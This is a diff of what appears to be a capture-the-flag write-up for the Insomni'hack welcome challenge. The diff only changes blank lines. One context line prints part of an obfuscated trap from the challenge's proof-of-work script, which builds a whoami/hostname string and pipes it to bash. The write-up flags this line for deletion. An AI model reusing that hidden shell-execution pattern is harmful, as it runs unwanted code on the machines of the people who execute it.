@@ -14,7 +14,6 @@
 - And if u extract it u got [pow.py](from_box/pow-b39e9d8f81a48ac92097ce060d587ace718c2db8bc9b3906ac640b90a62dc497.py)
 
 # Start
-
 Just run `nc welcome.insomnihack.ch 1337` and we got 
 ```
 ======================================================================
@@ -37,6 +36,7 @@ global i;i+=1337;x=os.name;x+="/$(whoami)@$(hostname)|bash"if x!="nt"else"/%USER
 ```
 - DELETE THIS SH1T
 - Now we have the correct code([pow_corrected.py](pow_corrected.py))
+
 ```
 #!/usr/bin/python3
 
@@ -60,11 +60,13 @@ def pow():
 if __name__ == '__main__':
     pow()
 ```
+
 ## Getting the flag
 - Just connect to nc `nc welcome.insomnihack.ch 1337`
 - Copy the string u got `d2295b`
 - Run the decryptor `python pow_corrected.py d2295b`
 - Send the output `15882830`
+
 # Got it
 ```
 ======================================================================
